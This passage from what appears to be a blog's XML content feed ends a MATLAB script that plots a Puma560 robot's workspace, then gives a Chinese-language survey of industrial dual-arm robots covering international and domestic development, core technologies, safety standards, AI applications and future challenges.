deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-266</span>, <span class="hljs-number">266</span>, <span class="hljs-number">10</span>));<br>q5 = deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">10</span>));<br>q6 = deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-266</span>, <span class="hljs-number">266</span>, <span class="hljs-number">10</span>));<br><br>workspace = [];<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">length</span>(q1)<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">length</span>(q2)<br>        <span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>:<span class="hljs-built_in">length</span>(q3)<br>            T = robot.fkine([q1(<span class="hljs-built_in">i</span>), q2(<span class="hljs-built_in">j</span>), q3(k), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]);<br>            position = transl(T); <span class="hljs-comment">% 提取平移部分</span><br>            workspace = [workspace; position];<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-built_in">figure</span>;<br><span class="hljs-built_in">plot3</span>(workspace(:,<span class="hljs-number">1</span>), workspace(:,<span class="hljs-number">2</span>), workspace(:,<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;MarkerSize&#x27;</span>, <span class="hljs-number">1</span>);<br>xlabel(<span class="hljs-string">&#x27;X (m)&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Y (m)&#x27;</span>);<br>zlabel(<span class="hljs-string">&#x27;Z (m)&#x27;</span>);<br>title(<span class="hljs-string">&#x27;Puma560 Robot Workspace&#x27;</span>);<br>grid on;<br>axis equal;<br></code></pre></td></tr></table></figure><p>得到结果:</p><figure><img src="/img/robotics-section-4-matlab-practice/result.png"alt="result" /><figcaption aria-hidden="true">result</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工业双臂机器人国内外发展技术概况</title>
    <link href="/2025/04/21/%E5%B7%A5%E4%B8%9A%E5%8F%8C%E8%87%82%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BD%E5%86%85%E5%A4%96%E5%8F%91%E5%B1%95%E6%8A%80%E6%9C%AF%E6%A6%82%E5%86%B5/"/>
    <url>/2025/04/21/%E5%B7%A5%E4%B8%9A%E5%8F%8C%E8%87%82%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BD%E5%86%85%E5%A4%96%E5%8F%91%E5%B1%95%E6%8A%80%E6%9C%AF%E6%A6%82%E5%86%B5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1id="工业双臂机器人国内外发展技术概况">工业双臂机器人国内外发展技术概况</h1><h2 id="摘要">摘要</h2><p>双臂机器人，作为高度模仿人类双臂协同操作能力的先进自动化设备，凭借其卓越的灵活性、强大的协作潜能以及拟人化的结构与功能，在现代工业自动化，特别是智能制造领域中占据着日益重要的战略地位。它们能够有效应对传统单臂机器人难以处理的复杂装配、精密操作、物料搬运以及人机紧密协作等任务场景。本报告旨在梳理和分析工业双臂机器人在国际与国内的技术发展现状、核心关键技术的突破与挑战、主要应用领域的渗透情况、当前面临的综合性挑战以及未来可预见的发展趋势。报告将分别细致探讨国际和国内发展状况，剖析支撑其功能实现的运动学、动力学、协调控制、传感感知、人机交互安全及人工智能融合等关键技术，并对整个行业生态面临的挑战与未来发展图景进行系统性的总结与展望，以求为相关领域的研发、产业化及决策提供有价值的参考。</p><h2 id="引言">1. 引言</h2><p>双臂机器人，顾名思义，是指集成并协同控制两个机械臂的机器人系统。其设计理念源于对人类双臂高效协同工作能力的模仿。区别于单一机械臂的机器人，双臂机器人最显著的特征在于其两个臂可以执行独立的任务，也可以紧密配合，共同完成需要双手操作的复杂动作，例如稳定地抓取和传递大型或易变形的物体，或者一个臂固定工件，另一个臂进行精密装配、拧紧、涂胶等操作。在自由度配置上，为了实现高度的灵活性和避障能力，工业双臂机器人通常采用单臂6轴或更先进的7轴设计，使得整个系统拥有至少12个，常见为14个甚至更多（如增加躯干或腰部转动自由度）的运动自由度。这种高冗余性不仅扩展了机器人的可达工作空间，更使其能够在狭窄、有障碍的环境中灵活规划运动路径，并能以多种姿态完成同一末端任务，增强了任务适应性。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/双臂机器人.jpg"alt="双臂机器人" /><figcaption aria-hidden="true">双臂机器人</figcaption></figure><p>在工业4.0和智能制造的大背景下，生产模式正经历从大规模、标准化向小批量、多品种、个性化定制的深刻变革。这种变革对自动化系统的柔性、适应性和智能化水平提出了前所未有的高要求。传统自动化流水线和单臂机器人在应对快速变化的产品类型、复杂的工艺流程以及人机协同需求时，往往显得刚性有余而柔性不足。双臂机器人恰恰以其独特的结构和功能优势，成为满足新时代工业需求的关键技术之一。它的重要性体现在：提升复杂任务处理能力，特别是在3C电子、汽车零部件等精密装配领域；实现真正的柔性生产，能够快速切换任务，适应不同产品线的混线生产；促进安全高效的人机协作，允许人类与机器人在共享空间内近距离协同工作，结合人的智能决策与机器人的力量、精度和耐力；替代危险或单调重复劳动，改善工作环境，提升生产效率和质量；以及开拓全新的应用领域，将自动化潜力延伸至物流、医疗、服务、科研等更广阔的空间。本报告将系统梳理双臂机器人的技术全貌，涵盖国际前沿动态、国内发展现状、核心技术难点与突破、应用场景实践、面临挑战及未来走向。</p><h2 id="国际双臂机器人发展状况">2. 国际双臂机器人发展状况</h2><p>国际上，双臂机器人的研究与应用起步较早，尤其在欧洲和日本，已形成较为成熟的技术体系和市场格局，拥有多个全球知名的品牌和产品。</p><h3 id="发展历程与主要参与者">2.1 发展历程与主要参与者</h3><p>双臂机器人的概念虽然早已存在于仿人机器人研究中，但其真正在工业领域获得关注并逐步商业化，关键节点包括20世纪末至21世纪初众多研究机构（如德国宇航中心DLR在力控和灵巧手研究、意大利理工学院IIT在仿人机器人设计方面）的前瞻性探索。进入21世纪第二个十年，RethinkRobotics推出的Baxter (2012)以其相对低廉的价格、强调人机交互（如表情反馈）和非专家编程（示教学习平台Intera）的理念，极大地推动了协作机器人尤其是双臂协作机器人的概念普及，虽然公司几经易手，其创新理念影响深远。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/Baxter.png"alt="Baxter" /><figcaption aria-hidden="true">Baxter</figcaption></figure><p>紧接着，ABB于2015年推出的YuMi，是一款专为3C行业小件装配设计的双臂协作机器人，以其紧凑设计、高精度（重复定位精度达0.02mm）、内置视觉与力传感、以及符合ISO标准的安全性，迅速成为工业双臂机器人的标杆产品之一。KUKA虽然其旗舰协作产品LBRiiwa是单臂，但其领先的轻量化设计、高灵敏度力控技术（可感知微小接触力）和安全功能，为整个协作机器人领域（包括双臂系统）奠定了重要的技术基础，其技术也被集成到双臂解决方案中。日本方面，Yaskawa（安川）是较早推出成熟双臂机器人系列 SDA (Slim Dual Arm)的厂商之一，其特点是拥有高达15个自由度（双臂各7自由度+躯干1自由度），动作极为灵活，适用于装配、搬运、焊接等多种复杂任务。FANUC作为工业机器人巨头，其协作机器人CRX系列虽以单臂为主，但也通过产品组合或特定型号（如CRX-25iA）支持双臂协同应用，并不断扩展其协作产品线。DensoWave在小型机器人领域有优势，其COBOTTA等协作机器人体现了人机协作的技术积累。Kawasaki（川崎重工）则推出了结构独特的duAro系列双臂SCARA机器人，适用于水平面的快速协同作业。此外，美国的顶尖高校如MIT、CMU、Stanford等持续在机器人基础理论、感知、控制、学习算法方面贡献前沿研究成果，为全球双臂机器人技术发展提供源动力。</p><h3 id="技术特点与主要应用">2.2 技术特点与主要应用</h3><p>国际领先的双臂机器人普遍具备以下技术亮点：1)高度灵活性与运动学冗余性：7自由度臂的设计是主流，允许在避开奇异点和障碍物的同时保持末端执行器的姿态，这对在拥挤生产线或复杂结构内部作业至关重要。2)成熟的协作能力与内置安全性：集成了力矩传感器进行力限制、速度监控、安全区域划分、碰撞检测与柔顺响应等功能，严格遵循ISO10218和ISO/TS15066安全标准，确保人机共存安全。双臂协调控制算法相对成熟，能够高效执行双手协同任务。3)先进的传感与感知集成：通常集成高分辨率的2D/3D视觉系统（用于定位、识别、引导、检测）、高精度六维力/力矩传感器（安装在腕部或基座，用于精密装配、打磨力控、安全交互），部分高端研究开始探索集成柔性触觉传感器阵列以提升抓取稳定性与精细感知能力。多传感器信息融合技术是实现环境全面感知的关键。4.）革新的易用性与编程方式：提供直观的图形化编程界面(GUI)、拖拽示教(Drag-and-DropProgramming)、手把手引导编程(Lead-throughProgramming)等方式，显著降低了操作和部署门槛，使得非机器人专家也能快速上手。这些技术优势使得双臂机器人在多个领域得到成功应用：a)电子产品精密装配(3C)：这是最主要的应用场景，如手机、平板、硬盘等内部微小、柔性零部件的插拔、拧螺丝（需双手稳定）、贴膜、点胶、功能检测等，YuMi等机型是此领域的代表。b)汽车零部件装配与检测：用于车灯、仪表盘、内饰件、线束、小型发动机部件等的装配、拧紧、涂胶、质量视觉检测等工序，特别适用于空间受限或需要双手配合的工位。c)物流分拣与包装： 利用双臂协同从混杂物料箱中进行视觉引导下的精确抓取（BinPicking）、对不规则或易碎品进行轻柔搬运、快速装箱、码垛等。d)实验室自动化与生物医药：在高通量筛选、样品制备与处理、精密移液、试管操作、细胞培养等环节替代人工，提高通量、一致性和无菌性。e)服务机器人领域的探索：在餐饮（咖啡/奶茶制作、简餐烹饪）、零售（货架整理、无人商店）、医疗康复（辅助病人进行上肢训练）等场景进行商业化试点和技术验证。</p><h3 id="发展趋势与挑战">2.3 发展趋势与挑战</h3><p>国际发展呈现以下趋势：1) 智能化深度融合：更多地集成AI算法（特别是深度学习、强化学习），实现更强的自主学习能力（如从演示中学习复杂装配技能）、环境自适应能力（如应对光照变化、物体位姿不确定性）和异常处理能力。2)人机交互体验升级：发展基于语音、手势、甚至脑机接口等多模态的自然交互方式，使协作更流畅、直观；安全机制从被动防护向主动预测和意图理解演进。3)移动双臂机器人平台：将双臂系统安装在自主移动机器人（AMR/AGV）上，形成“手脚并用”的移动操作平台，极大拓展了机器人的工作范围和任务灵活性，适用于大型仓库、医院、柔性生产车间等。4)灵巧手技术突破与集成：研发并集成具有更多自由度、更丰富传感能力（力、滑移、温度等）的灵巧手，以逼近人手的操作灵活性和精细度。5)持续提升易用性与部署速度：开发更智能的编程工具（如自动路径规划、任务级编程）、标准化接口和软件库，实现更快的系统集成和任务部署。同时，国际发展也面临显著挑战：1)高昂的成本：双臂系统本身的复杂性以及集成的传感器、控制器等使得总体拥有成本较高，限制了其在中小型企业的广泛应用。2)复杂任务编程挑战：尽管易用性有所提高，但对于需要精密力控、复杂协调、或与多种外部设备交互的任务，编程调试仍然复杂且耗时。3)非结构化环境下的鲁棒性：在动态变化、充满不确定性的真实世界环境中（如家庭环境、杂乱的仓库），保证机器人长时间稳定可靠运行仍是技术难题。4)标准化进程缓慢：不同厂商之间的硬件接口、通信协议、软件API、安全认证细节等缺乏统一标准，增加了系统集成的难度和成本。</p><h2 id="国内双臂机器人发展状况">3. 国内双臂机器人发展状况</h2><p>在中国，得益于庞大的制造业基础、国家战略层面的大力推动以及日益增长的自动化升级需求，双臂机器人产业近年来呈现出蓬勃发展的态势。</p><p>《中国制造2025》等国家战略将机器人及其核心零部件列为重点突破领域，各级政府也出台了相应的财政补贴、税收优惠、研发支持等扶持政策。同时，国内制造业面临劳动力成本持续上升、招工难问题，以及产品生命周期缩短、个性化需求增加带来的柔性生产压力，这些都为自动化程度更高、柔性更好的双臂机器人创造了巨大的潜在市场。国内机器人产业链在市场和政策双重驱动下日趋完善，尽管高端核心零部件仍有赖进口，但在中低端市场，国产减速器（谐波、RV）、伺服电机、控制器等已取得显著进步，为国产机器人本体的发展奠定了基础。主要参与者包括：1)领先研究机构：中科院沈阳自动化所、自动化所，以及哈尔滨工业大学、上海交通大学、浙江大学、清华大学、北京航空航天大学等顶尖高校，在机器人基础理论（运动学、动力学、控制理论）、协调控制算法、视觉与力传感技术、人机交互等方面开展了大量前沿研究，并通过技术转移、联合研发等方式为产业界提供智力支持。2)主要机器人企业： 新松(SIASUN)作为国内机器人行业的领军企业，较早布局双臂协作机器人，推出了多款面向工业、服务、特种应用的产品。埃斯顿(Estun)在收购德国百年焊接机器人企业Cloos后，技术实力和产品线进一步完善，其协作机器人产品也包含双臂解决方案。遨博(AUBO)、节卡(JAKA)是国内协作机器人领域的代表性企业，以其开放的平台、强调安全易用和性价比，在市场上快速成长，并积极探索双臂协作应用。珞石(ROKAE)以其高性能控制系统和轻量化协作机器人获得关注，亦有双臂应用潜力。此外，大族机器人、越疆科技(Dobot)等也在协作或桌面级双臂机器人领域有所布局。3) 新兴创业公司：依托高校技术成果转化或吸引海外归国人才，涌现出一批专注于双臂机器人特定技术（如灵巧手、力控、AI算法）或细分应用的初创公司，它们机制灵活，是推动技术创新的重要力量。</p><p>国内双臂机器人在技术层面取得了长足进步：1)核心零部件的国产化率逐步提升，性能指标（如精度、寿命、效率）持续改善，部分产品已能满足中端应用需求，但在高端性能的稳定性、一致性以及长期可靠性方面与国际顶级品牌（如哈默纳科、纳博特斯克等）仍存在差距。2)协调控制算法方面，国内企业和研究机构已掌握基本的双臂运动规划、同步控制、避障等技术，并能实现一些典型的双臂协同任务，但在复杂力/位混合控制、动态协调、冗余自由度优化利用等方面的算法深度和鲁棒性有待加强。3)人机协作安全技术已成为国产协作机器人的标配，普遍遵循国际标准设计，采用碰撞检测、力限制等手段，但在安全认证的权威性、复杂协作场景下的安全策略精细化设计方面仍在积累经验。4)软件平台与易用性是国产厂商的发力重点，普遍提供图形化编程、拖拽示教、API接口等，努力降低使用门槛，但在软件生态的丰富度、跨平台兼容性、长期维护与更新方面与国际成熟平台相比尚有提升空间。与国际水平比较，国产双臂机器人的优势在于：更贴近国内特定行业（如3C代工）的工艺需求和成本敏感性；能够提供更快速的本地化技术支持和定制化集成服务；整体价格通常更具竞争力。差距则主要体现在：高端核心零部件性能的瓶颈；底层控制算法的精度、动态响应和抗干扰能力；品牌在全球市场的认知度和信誉度；在要求极高精度、极高可靠性或复杂工艺的顶尖应用场景中的实践经验；以及软件平台的稳定性和生态系统的成熟度。应用方面，国产双臂机器人目前最集中的领域仍然是制造业，特别是3C电子（手机部件组装、测试、包装）、汽车零部件（小型件装配、检测），正逐步向家电、五金卫浴、食品饮料、新能源（电池组装检测）等行业拓展。同时，在教育科研领域，作为先进教学和研究平台受到高校和职校的欢迎。在医疗康复（辅助训练器械）、新零售（无人售货柜补货、智慧餐饮）、智慧物流（仓库自动化分拣）等新兴领域的应用也在积极探索和试点推广。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/中国双臂机器人.png"alt="中国双臂机器人" /><figcaption aria-hidden="true">中国双臂机器人</figcaption></figure><p>国内双臂机器人产业呈现以下发展趋势：1) 技术加速追赶与自主化提升：在国家政策持续引导和巨大市场拉动下，对核心零部件、高性能控制算法、AI融合技术的研发投入将持续加大，有望在更多技术点上缩小与国际先进水平的差距，提升自主可控水平。2)应用场景深度拓展与行业定制化：将从通用装配、搬运向更复杂、更精密的工艺场景（如打磨、焊接、柔性物料操作）渗透，并针对特定行业（如医疗、半导体、农业）的需求开发深度定制化的软硬件解决方案。3)产业链协同创新加强：上下游企业（零部件供应商、本体制造商、系统集成商、应用软件开发者、最终用户）之间的合作将更加紧密，形成协同攻关、风险共担、利益共享的产业生态。4)智能化水平显著提升：AI技术将不再是点缀，而是深度融入感知、决策、控制全流程，使机器人具备更强的自主学习、环境适应和人机交互能力。5)国产品牌影响力和市场份额提升：随着技术和产品质量的不断提升，国产品牌在国内市场的认可度和占有率有望进一步提高，并有更多企业具备实力参与国际市场竞争。同时，国内发展也面临严峻挑战：1)核心技术“卡脖子”问题仍突出：高端减速器、伺服系统、传感器等关键部件在精度、寿命、可靠性上与国外的差距，直接制约了国产机器人整体性能的提升和成本的下降。2)基础研究与原始创新能力不足：在机器人学基础理论、新材料应用、颠覆性传感技术等前沿基础研究方面投入相对不足，原始创新成果较少。3)应用深度与广度仍需突破：尽管应用案例增多，但在许多技术要求高、工艺复杂的场景，应用的稳定性、效率和经济性仍有待大规模验证和提升，应用场景的“杀手级”应用不够多。4)复合型专业人才严重短缺：既懂机器人底层技术、又懂特定行业工艺流程和应用开发的复合型人才培养滞后于产业发展速度。5)市场无序竞争与同质化风险：市场参与者众多，可能出现低价竞争、忽视研发投入和产品质量的现象，不利于产业长期健康发展。</p><h2 id="双臂机器人核心技术">4. 双臂机器人核心技术</h2><p>双臂机器人的高效、安全、智能运行，是建立在一系列复杂而精密的支撑技术基础之上的。</p><h3 id="运动学与运动学建模">4.1 运动学与运动学建模</h3><p>双臂系统的高自由度（冗余性）是其灵活性的来源，但也带来了运动学逆解的无穷多解问题。需要采用如梯度投影法、雅可比伪逆法等有效的冗余解决方案，在满足末端任务的同时优化其他性能指标（如避障、避关节极限、能量消耗最小化）。当双臂协同操作同一物体形成闭环运动链时，其运动学和动力学耦合关系更为复杂，需要专门的闭链建模方法（如基于约束的方法）。精确且计算高效的动力学模型（通常基于牛顿-欧拉法或拉格朗日法推导）是实现高级控制（如模型基的力控、阻抗控制）和实时仿真的基础，这对计算能力提出了很高要求。</p><h3 id="双臂协调运动规划与控制">4.2 双臂协调运动规划与控制</h3><p>这是实现“像人手一样工作”的核心。涉及到任务空间（描述末端或操作对象的位姿、力）和关节空间（描述各关节变量）之间的复杂映射与协调。需要规划出在动态环境中无碰撞的运动轨迹，不仅要避开外部障碍物，还要实时避免双臂之间的自碰撞，这在高维状态空间中是NP-hard问题，需要高效的实时规划算法（如改进的RRT<em>,PRM</em>, D*Lite等）。在许多交互任务中，需要实现力/位混合控制，即在某些方向精确控制位置/姿态，而在另一些方向精确控制与环境的接触力/力矩。常用的控制框架包括基于选择矩阵的混合控制、阻抗控制（调节机器人末端对外力的“柔顺”程度）和导纳控制。对于双臂协同搬运，需要解决负载分配（如何分担物体的重量和惯性力）和内力优化（避免对物体产生不必要的挤压或拉伸力）问题。整个控制系统必须满足实时性（控制周期通常在毫秒级）和鲁棒性（对模型误差、外部干扰不敏感）的要求。</p><h3 id="传感与感知技术">4.3 传感与感知技术</h3><p>感知技术是机器人获取环境信息和自身状态，实现智能决策与交互的基础。视觉传感是主要手段，包括使用2D相机进行目标识别、定位、二维码读取、缺陷检测等；使用3D相机（如结构光、双目立体视觉、飞行时间ToF）获取场景深度信息，用于三维重建、物体位姿精确估计（尤其对于抓取和装配至关重要）、导航避障等。视觉伺服（VisualServoing）技术利用实时视觉反馈直接引导机器人运动，提高定位精度和动态适应性。力/力矩传感对于实现精巧交互至关重要，腕部六维力/力矩传感器可以直接测量末端与环境的作用力，是实现精密装配（如轴孔配合）、打磨抛光力控制、安全碰撞检测的关键部件。关节力矩传感器则可以用于计算末端力、实现更柔顺的控制（如阻抗控制）和更灵敏的碰撞检测。触觉传感模仿人类皮肤功能，旨在感知接触点的分布、压力大小、物体表面纹理、滑移等信息，对于实现灵巧抓取、非结构化环境下的稳定操作具有巨大潜力，但目前在成本、耐用性、集成度方面仍面临挑战，多处于研究和高端应用探索阶段。多传感器信息融合是将来自不同模态、不同位置的传感器信息（如视觉、力、触觉、本体感觉信息如关节角度和速度等）进行有效整合、关联和解释，以获得比单一传感器更全面、更准确、更鲁棒的环境状态认知，是提升机器人智能感知水平的关键技术。融合算法需要解决数据对齐、时间同步、不确定性处理等问题。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/双臂机器人建模.png"alt="双臂机器人建模" /><figcaption aria-hidden="true">双臂机器人建模</figcaption></figure><h3 id="人机协作与安全技术">4.4 人机协作与安全技术</h3><p>双臂机器人设计和运行必须严格遵循国际安全标准（如ISO10218系列规定了机器人本体、系统及集成的安全要求，ISO/TS15066则专门针对协作机器人操作给出了指导和量化要求，如碰撞时的力/压力限值）。核心安全功能通常包括：1)安全相关的受监控停止 (Safety-rated monitored stop):通过安全传感器（如光幕、激光扫描仪）检测到人进入预设危险区域时，机器人可靠地停止。2)手导引 (Hand guiding):允许操作员在安全模式下，通过直接拖动机器人手臂的方式进行路径示教或精确定位。3)速度与分离监控 (Speed and separation monitoring, SSM):利用传感器（如安全视觉系统）实时监测人与机器人之间的距离，并根据距离动态调整机器人运行速度，距离越近速度越慢，直至停止，保持安全距离。4)功率与力限制 (Power and force limiting, PFL):这是协作机器人的核心安全机制，通过轻量化、圆滑的结构设计减少碰撞能量，更重要的是通过内置的力/力矩传感器或基于模型的力矩估算，实时监控并限制机器人本体或末端工具在与人发生意外接触时可能产生的冲击力和准静态压力，确保其低于ISO/TS15066规定的安全阈值。快速可靠的碰撞检测与响应机制是PFL的基础，一旦检测到异常接触，机器人需在极短时间内（毫秒级）停止或执行安全的回退/泄力动作。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/人机交互.png"alt="人机交互" /><figcaption aria-hidden="true">人机交互</figcaption></figure><p>更进一步，研究开始探索利用视觉、深度学习等技术进行人员意图识别与行为预测，使机器人能预判人的动作，提前规划更安全的路径或调整协作策略，实现更主动、更智能的安全防护。同时，提供直观易用的交互界面（如图形化编程软件、平板示教器）和便捷的示教方式（如手把手引导、基于演示的编程）对于降低使用门槛、提高协作效率至关重要。</p><h3 id="人工智能与机器学习的应用">4.5 人工智能与机器学习的应用</h3><p>近年来，AI和ML技术正在赋予双臂机器人前所未有的学习、适应和决策能力。模仿学习(LfD)让机器人通过观察人类演示（如通过动捕设备、视觉观察或手把手引导记录轨迹和力信息）来学习难以显式编程的复杂技能，如精细装配序列、打结、物品整理等。强化学习(RL)则让机器人在与环境的反复交互中，通过试错和奖励机制自主学习最优的行为策略，特别适用于优化抓取姿态、动态避障、多目标协调等问题，但通常需要大量的训练数据或仿真环境。利用机器学习模型（如基于模型的RL或自适应控制算法），使机器人能够实时感知环境变化（如光照变化、物体位置移动、人出现），并自主调整其行为策略（如调整抓取点、改变路径、切换任务模式），处理未预料的异常情况，实现更强的鲁棒性和自主性。深度学习极大地提升了机器人的视觉感知能力，例如，利用卷积神经网络(CNN)进行复杂场景下的目标检测与识别、实例分割、6D位姿估计；利用循环神经网络(RNN)或Transformer模型理解时序信息，如预测人的动作轨迹。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/ai驱动的双臂机器人.jpg"alt="Ai驱动的双臂机器人" /><figcaption aria-hidden="true">Ai驱动的双臂机器人</figcaption></figure><p>这使得机器人在非结构化环境中的感知更为精准可靠。通过采集和分析机器人运行过程中的大量传感器数据（如关节电流、力矩、振动、温度等），利用机器学习模型（如异常检测算法、时间序列预测模型）可以提前预测潜在的部件故障或性能衰退，实现预测性维护(PdM)，减少意外停机时间，提高设备综合效率(OEE)。</p><h3 id="系统集成与软件架构">4.6 系统集成与软件架构</h3><p>将复杂的硬件（双臂本体、传感器、末端执行器、控制器）和软件（控制算法、感知算法、AI模型、用户界面）有效地集成在一起，构建一个稳定、高效、可扩展且易于使用的机器人系统。实时操作系统(RTOS)（如VxWorks,QNX,Xenomai）是底层控制系统的基础，保证运动控制指令的低延迟（通常&lt;1ms）和确定性执行，这对于安全和高性能至关重要。机器人操作系统(ROS/ROS2)已成为事实上的标准中间件，它提供了一整套用于构建机器人应用程序的库和工具，包括标准的发布/订阅消息传递机制、硬件抽象层、可视化工具(RViz)、仿真环境(Gazebo)等，极大地促进了机器人软件的模块化开发、代码复用、快速原型设计和社区协作。通信协议与互操作性是实现机器人与外部设备（如PLC、上位机、其他机器人、MES系统）协同工作的关键，需要支持如EtherCAT、Profinet、EtherNet/IP等实时工业以太网协议，以及TCP/IP、OPCUA等标准通信接口。良好的模块化与可扩展性设计体现在软硬件架构上，应方便用户根据应用需求添加或更换传感器、末端执行器，集成新的功能模块（如特定工艺包），或进行二次开发。</p><h2 id="综合挑战与未来展望">5. 综合挑战与未来展望</h2><p>双臂机器人在迈向更广泛应用的过程中，仍需克服一系列技术、市场和生态层面的挑战，但其未来的发展潜力巨大，趋势明确。</p><p>当前商业化的机器人末端执行器大多是简单的二指或三指夹爪，与人手的灵活性、多功能性（抓握、操作、感知）相去甚远。研发出成本可控、坚固耐用、具备丰富传感能力（力、滑移、触觉分布）并能与双臂系统实现高精度协调控制的灵巧手，是提升双臂机器人完成精细复杂任务能力的关键，也是长期以来的研究难点。如何让机器人在充满不确定性、动态变化且缺乏先验知识的真实世界环境（如家庭、建筑工地、灾难现场、非标自动化产线）中，能够像人一样稳定、可靠、安全地长时间工作，仍是巨大挑战。这需要感知（更强的环境理解和泛化能力）、规划（快速响应和处理意外情况）、控制（对干扰和模型误差的鲁棒性）等方面的全面突破。尽管示教编程等方式已降低了简单任务的编程门槛，但对于需要复杂逻辑判断、精密力控、多设备协调、或与企业信息系统深度集成的应用，编程、调试和部署仍然需要专业的工程师耗费大量时间。需要发展更智能化的任务级编程、自动化部署工具以及更强大的仿真验证平台。不同品牌机器人之间的硬件接口（如工具快换法兰）、软件API、数据格式、安全协议等缺乏统一标准，给用户进行系统集成、更换部件或开发通用应用程序带来了很大障碍，增加了成本和复杂性。推动行业标准的制定和普及至关重要。</p><p>同时，双臂机器人本体价格不菲，加上传感器、末端执行器、安全防护、系统集成和编程调试等费用，总体拥有成本(TCO)远高于传统单臂机器人或专机。如何有效降低成本，并在应用中清晰地量化其带来的效益（如柔性提升、质量改善、人因工程优化等难以直接计量的价值），向用户证明其投资的合理性，是市场推广面临的主要挑战。在人机协作场景中，一线工人可能对与机器人近距离工作感到不安，管理者可能对其可靠性和安全性存有疑虑。建立用户信任需要充分的安全验证、可靠的性能表现和良好的人机交互设计。此外，操作、维护、编程双臂机器人需要新的技能，现有劳动力可能需要再培训，而市场上既懂机器人又懂特定工艺的复合型人才供给严重不足。除了已相对成熟的3C装配等少数领域，还需要在更广泛的行业中找到并验证那些只有双臂（或双臂协作）机器人才能高效、经济地完成的“杀手级应用”场景，以证明其不可替代的价值，驱动市场需求的规模化增长。</p><figure><img src="/img/工业双臂机器人国内外发展技术概况/未来双臂机器人.jpg"alt="未来双臂机器人" /><figcaption aria-hidden="true">未来双臂机器人</figcaption></figure><p>在未来，AI将不再仅仅是感知增强，而是深度渗透到规划、控制和学习的全过程。机器人将具备更强的自主学习能力（如通过少量样本快速学习新任务），能够理解更复杂的指令（任务级指令），在未知环境中进行自主探索和决策，处理更广泛的异常情况。交互方式将超越简单的示教和图形界面，向基于自然语言理解、手势识别、眼神跟踪甚至脑机接口的多模态自然交互演进。安全机制将从被动响应向主动预测（基于对人行为意图的理解）和自适应风险评估转变，实现人机之间更流畅、更信任、更高效的协同。双臂系统与自主移动机器人(AMR)的结合将成为标准配置之一，形成具有“手”和“脚”的完整移动操作能力平台。这种平台将在大型工厂内的物料搬运与操作、物流仓库的自动化拣选与包装、医院内的药品配送与辅助服务、甚至未来家庭服务等场景发挥巨大作用。同时需要解决移动平台导航精度、双臂与移动基座协调、能源管理等技术问题。利用云计算平台的强大算力进行复杂的离线计算（如大规模模型训练、全局路径优化、群体智能协同），并通过云端共享知识库和技能库，加速机器人学习进程。同时，将实时性要求高的感知处理和控制任务部署在边缘端，实现云-边-端协同，提升机器人系统的整体性能和智能水平。通过核心零部件的国产化替代与技术进步、规模化生产效应、模块化设计（方便定制和维护）、新材料应用（实现轻量化）等多种途径持续降低双臂机器人的购置和使用成本。设计上将更注重紧凑性、能效和环境适应性。将出现更多针对特定行业（如医疗手术辅助、食品加工、农业采摘、建筑自动化）工艺特点深度定制的双臂机器人软硬件解决方案，包括专用的末端执行器、传感器套件、行业工艺软件包和算法库。同时，围绕双臂机器人的开放平台将形成更丰富的开发者生态和应用市场。</p><h2 id="结论">6. 结论</h2><p>工业双臂机器人作为融合了精密机械、先进传感、复杂控制与人工智能等多学科尖端技术的自动化装备，正处在其技术演进和应用拓展的关键跃升期。国际上，以欧洲、日本的行业巨头为引领，技术成熟度和产品性能持续领跑，不断刷新双臂机器人在精度、安全性、易用性及智能化方面的标杆。在中国，巨大的市场需求、有力的政策扶持以及本土企业的奋发努力，共同推动了国内双臂机器人产业的快速发展，在技术追赶、成本控制、本土化服务等方面取得了显著成效，形成了独特的竞争优势。双臂机器人的卓越性能，根植于其核心关键技术的不断进步，包括高自由度冗余运动学与动力学建模、精密的双臂协调运动规划与力/位混合控制、多模态传感信息的深度融合与智能感知、确保人机共融的安全协作机制，以及日益重要的人工智能与机器学习算法的赋能。当前，双臂机器人已在3C电子装配、汽车零部件制造、自动化物流等领域展现出显著的应用价值，并正以积极的姿态向医疗健康、科学研究、商业服务乃至未来家庭等更广阔的领域渗透。然而，我们必须清醒地认识到，双臂机器人的大规模普及之路并非坦途，其仍面临着来自技术层面（如灵巧操作能力的提升、非结构化环境适应性的挑战、编程部署的易用性瓶颈）以及市场层面（如高昂成本对投资回报率的压力、用户接受度与信任的建立、专业人才培养的滞后）的多重严峻挑战。</p><p>展望未来，双臂机器人的发展图景令人期待。更高程度的智能化、更加自然安全的人机交互方式、与移动平台结合带来的泛在操作能力、云端智能与大数据技术的深度赋能，以及持续的成本优化和面向行业的深度定制，将共同塑造其未来的技术形态和应用格局。成功克服现存挑战，精准把握发展趋势，双臂机器人必将在未来的智能制造体系和社会自动化进程中扮演愈发核心的角色，成为推动生产力跃升和社会变革的关键驱动力之一。对于中国而言，抓住这一历史机遇，坚定不移地投入核心技术自主研发，深化产学研用的协同创新机制，积极培育开放共赢的产业生态系统，将是实现从跟跑到并跑，乃至在部分领域实现领跑的战略关键。</p>]]></content>
    
    
    <categories>
      
